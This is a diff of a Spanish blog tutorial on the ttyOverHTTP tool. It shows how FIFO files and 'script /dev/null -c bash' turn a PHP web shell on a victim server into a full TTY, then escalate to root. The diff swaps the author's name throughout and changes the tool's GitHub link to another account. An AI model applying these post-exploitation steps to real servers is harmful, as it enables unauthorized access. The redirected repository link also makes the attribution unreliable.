@@ -20,7 +20,7 @@ tags:
 
 Podéis encontrar esta herramienta en el siguiente enlace:
 
-* [https://github.com/s4vitar/ttyoverhttp](https://github.com/s4vitar/ttyoverhttp)
+* [https://github.com/flippermen/ttyoverhttp](https://github.com/flippermen/ttyoverhttp)
 
 ## ¿Qué es ttyOverHTTP?
 
@@ -67,32 +67,32 @@ En Linux, hay una utilidad que nos permite crear archivos **FIFO**. Un fichero F
 Veamos un ejemplo práctico de su uso. Por un lado desde terminal, haremos lo siguiente:
 
 ```go
-┌─[s4vitar@parrot]─[~/Desktop/example]
+┌─[flippermen@parrot]─[~/Desktop/example]
 └──╼ $mkfifo input; tail -f input | /bin/sh 2>&1 > output
 ```
 
 Esto se quedará en escucha, por lo que posteriormente deberemos abrir una nueva consola aparte para hacer las pruebas. Ahora haremos lo siguiente:
 
 ```go
-┌─[s4vitar@parrot]─[~/Desktop/example]
+┌─[flippermen@parrot]─[~/Desktop/example]
 └──╼ $ls
 input  output
-┌─[s4vitar@parrot]─[~/Desktop/example]
+┌─[flippermen@parrot]─[~/Desktop/example]
 └──╼ $echo "whoami" > input
-┌─[s4vitar@parrot]─[~/Desktop/example]
+┌─[flippermen@parrot]─[~/Desktop/example]
 └──╼ $cat output 
-s4vitar
-┌─[s4vitar@parrot]─[~/Desktop/example]
+flippermen
+┌─[flippermen@parrot]─[~/Desktop/example]
 └──╼ $echo "pwd" > input
-┌─[s4vitar@parrot]─[~/Desktop/example]
+┌─[flippermen@parrot]─[~/Desktop/example]
 └──╼ $echo "cd .." > input
-┌─[s4vitar@parrot]─[~/Desktop/example]
+┌─[flippermen@parrot]─[~/Desktop/example]
 └──╼ $echo "pwd" > input
-┌─[s4vitar@parrot]─[~/Desktop/example]
+┌─[flippermen@parrot]─[~/Desktop/example]
 └──╼ $cat output 
-s4vitar
-/home/s4vitar/Desktop/example
-/home/s4vitar/Desktop
+flippermen
+/home/flippermen/Desktop/example
+/home/flippermen/Desktop
 ```
 
 Si os fijáis, para cada comando proporcionado en `input`, se nos lista el resultado del comando aplicado a nivel de sistema en el fichero `output`.
@@ -100,77 +100,77 @@ Si os fijáis, para cada comando proporcionado en `input`, se nos lista el resul
 Ojo cuidado, esto sigue sin ser una TTY, sin embargo... podemos hacer lo siguiente:
 
 ```go
-┌─[s4vitar@parrot]─[~/Desktop/example]
+┌─[flippermen@parrot]─[~/Desktop/example]
 └──╼ $echo "script /dev/null -c bash" > input
-┌─[s4vitar@parrot]─[~/Desktop/example]
+┌─[flippermen@parrot]─[~/Desktop/example]
 └──╼ $cat output 
-s4vitar
-/home/s4vitar/Desktop/example
-/home/s4vitar/Desktop
+flippermen
+/home/flippermen/Desktop/example
+/home/flippermen/Desktop
 Script started, file is /dev/null
-┌─[s4vitar@parrot]─[~/Desktop]
-└──╼ $┌─[s4vitar@parrot]─[~/Desktop/example]
+┌─[flippermen@parrot]─[~/Desktop]
+└──╼ $┌─[flippermen@parrot]─[~/Desktop/example]
 └──╼ $
 ```
 
 Fijaros cómo ahora se nos abre una consola aparte de la nuestra al leer el ficherito `output`. Tal vez lo veis mejor así:
 
 ```go
-┌─[s4vitar@parrot]─[~/Desktop/example]
+┌─[flippermen@parrot]─[~/Desktop/example]
 └──╼ $cat output; echo
-s4vitar
-/home/s4vitar/Desktop/example
-/home/s4vitar/Desktop
+flippermen
+/home/flippermen/Desktop/example
+/home/flippermen/Desktop
 Script started, file is /dev/null
-┌─[s4vitar@parrot]─[~/Desktop]
+┌─[flippermen@parrot]─[~/Desktop]
 └──╼ $
-┌─[s4vitar@parrot]─[~/Desktop/example]
+┌─[flippermen@parrot]─[~/Desktop/example]
 └──╼ $
 ```
 
 Ahí está. La superior a la de abajo del todo es la gestionada desde los ficheros `input` y `output`. ¿Qué es lo mejor de todo?, lo siguiente:
 
 ```go
-┌─[s4vitar@parrot]─[~/Desktop/example]
+┌─[flippermen@parrot]─[~/Desktop/example]
 └──╼ $echo "tty" > input
-┌─[s4vitar@parrot]─[~/Desktop/example]
+┌─[flippermen@parrot]─[~/Desktop/example]
 └──╼ $cat output; echo
-s4vitar
-/home/s4vitar/Desktop/example
-/home/s4vitar/Desktop
+flippermen
+/home/flippermen/Desktop/example
+/home/flippermen/Desktop
 Script started, file is /dev/null
-┌─[s4vitar@parrot]─[~/Desktop]
+┌─[flippermen@parrot]─[~/Desktop]
 └──╼ $tty
 /dev/pts/4
-┌─[s4vitar@parrot]─[~/Desktop]
+┌─[flippermen@parrot]─[~/Desktop]
 └──╼ $
-┌─[s4vitar@parrot]─[~/Desktop/example]
+┌─[flippermen@parrot]─[~/Desktop/example]
 └──╼ $
 ```
 
 Ya estamos en una TTY, y a partir de aquí es sencillo aprovechar al máximo las utilidades de consola:
 
 ```go
-┌─[s4vitar@parrot]─[~/Desktop/example]
+┌─[flippermen@parrot]─[~/Desktop/example]
 └──╼ $echo "php --interactive" > input
-┌─[s4vitar@parrot]─[~/Desktop/example]
+┌─[flippermen@parrot]─[~/Desktop/example]
 └──╼ $echo '$word = "Hola";' > input
-┌─[s4vitar@parrot]─[~/Desktop/example]
+┌─[flippermen@parrot]─[~/Desktop/example]
 └──╼ $echo 'echo $word;' > input
-┌─[s4vitar@parrot]─[~/Desktop/example]
+┌─[flippermen@parrot]─[~/Desktop/example]
 └──╼ $echo 'quit' > input
-┌─[s4vitar@parrot]─[~/Desktop/example]
+┌─[flippermen@parrot]─[~/Desktop/example]
 └──╼ $echo 'whoami' > input
-┌─[s4vitar@parrot]─[~/Desktop/example]
+┌─[flippermen@parrot]─[~/Desktop/example]
 └──╼ $cat output
-s4vitar
-/home/s4vitar/Desktop/example
-/home/s4vitar/Desktop
+flippermen
+/home/flippermen/Desktop/example
+/home/flippermen/Desktop
 Script started, file is /dev/null
-┌─[s4vitar@parrot]─[~/Desktop]
+┌─[flippermen@parrot]─[~/Desktop]
 └──╼ $tty
 /dev/pts/4
-┌─[s4vitar@parrot]─[~/Desktop]
+┌─[flippermen@parrot]─[~/Desktop]
 └──╼ $php --interactive
 Interactive mode enabled
 
@@ -178,32 +178,32 @@ php > $word = "Hola";
 php > echo $word;
 Hola
 php > quit
-┌─[s4vitar@parrot]─[~/Desktop]
+┌─[flippermen@parrot]─[~/Desktop]
 └──╼ $whoami
-s4vitar
-┌─[s4vitar@parrot]─[~/Desktop]
+flippermen
+┌─[flippermen@parrot]─[~/Desktop]
 └──╼ $
-┌─[s4vitar@parrot]─[~/Desktop/example]
+┌─[flippermen@parrot]─[~/Desktop/example]
 └──╼ $
 ```
 
 De igual manera, podemos efectuar migraciones de usuario o convertirnos en root proporcionando la contraseña:
 
 ```go
-─[s4vitar@parrot]─[~/Desktop/example]
+─[flippermen@parrot]─[~/Desktop/example]
 └──╼ $echo "sudo su" > input
-┌─[s4vitar@parrot]─[~/Desktop/example]
+┌─[flippermen@parrot]─[~/Desktop/example]
 └──╼ $echo "************" > input # Aquí pondríais vuestra contraseña
-┌─[s4vitar@parrot]─[~/Desktop/example]
+┌─[flippermen@parrot]─[~/Desktop/example]
 └──╼ $cat output ; echo
-s4vitar
-/home/s4vitar/Desktop/example
-/home/s4vitar/Desktop
+flippermen
+/home/flippermen/Desktop/example
+/home/flippermen/Desktop
 Script started, file is /dev/null
-┌─[s4vitar@parrot]─[~/Desktop]
+┌─[flippermen@parrot]─[~/Desktop]
 └──╼ $tty
 /dev/pts/4
-┌─[s4vitar@parrot]─[~/Desktop]
+┌─[flippermen@parrot]─[~/Desktop]
 └──╼ $php --interactive
 Interactive mode enabled
 
@@ -211,15 +211,15 @@ php > $word = "Hola";
 php > echo $word;
 Hola
 php > quit
-┌─[s4vitar@parrot]─[~/Desktop]
+┌─[flippermen@parrot]─[~/Desktop]
 └──╼ $whoami
-s4vitar
-┌─[s4vitar@parrot]─[~/Desktop]
+flippermen
+┌─[flippermen@parrot]─[~/Desktop]
 └──╼ $sudo su
-[sudo] password for s4vitar: 
+[sudo] password for flippermen: 
 ┌─[root@parrot]─[~/Desktop]
 └──╼ #
-┌─[s4vitar@parrot]─[~/Desktop/example]
+┌─[flippermen@parrot]─[~/Desktop/example]
 └──╼ $
 ```
 
@@ -316,7 +316,7 @@ while True:
 Entonces bien, imaginad que ya tenéis un archivo `cmd.php` alojado en el servidor víctima, pues mirad que sencillo:
 
 ```go
-┌─[s4vitar@parrot]─[~/Desktop/example]
+┌─[flippermen@parrot]─[~/Desktop/example]
 └──╼ $python3 ttyOverHTTP.py 
 > whoami
 www-data
@@ -327,7 +327,7 @@ www-data
 /home
 > ls -l
 total 0
-drwxr-xr-x 1 s4vitar s4vitar 1156 Feb  4 12:19 s4vitar
+drwxr-xr-x 1 flippermen flippermen 1156 Feb  4 12:19 flippermen
 ```
 
 Ya directamente se gestiona desde el script la sesión, pudiendo así ver los outputs de los comandos que especifiquemos desde `input`. 
@@ -335,31 +335,31 @@ Ya directamente se gestiona desde el script la sesión, pudiendo así ver los ou
 El procedimiento ahora para obtener una TTY y proseguir naturalmente sería el mismo que os mostré anteriormente:
 
 ```go
-┌─[s4vitar@parrot]─[~/Desktop/example]
+┌─[flippermen@parrot]─[~/Desktop/example]
 └──╼ $python3 ttyOverHTTP.py 
 > whoami                  
 www-data
 > script /dev/null -c bash
 Script started, file is /dev/null
 www-data@parrot:/var/www/html$
-> su s4vitar
-su s4vitar
+> su flippermen
+su flippermen
 Password:
 > ************* # Aquí va vuestra contraseña
 
 ░▒▓    /var/w/html  ✔ ▓▒░                                                  
 > bash
 bash
-┌──[s4vitar@parrot]─[/var/www/html]
+┌──[flippermen@parrot]─[/var/www/html]
 └──╼ $
 > whoami
 whoami
-s4vitar
-┌──[s4vitar@parrot]─[/var/www/html]
+flippermen
+┌──[flippermen@parrot]─[/var/www/html]
 └──╼ $
 > sudo su
 sudo su
-[sudo] password for s4vitar:
+[sudo] password for flippermen:
 > *********** # Aquí va vuestra contraseña
 
 ░▒▓    /var/w/html  ✔   ▓▒░                                                
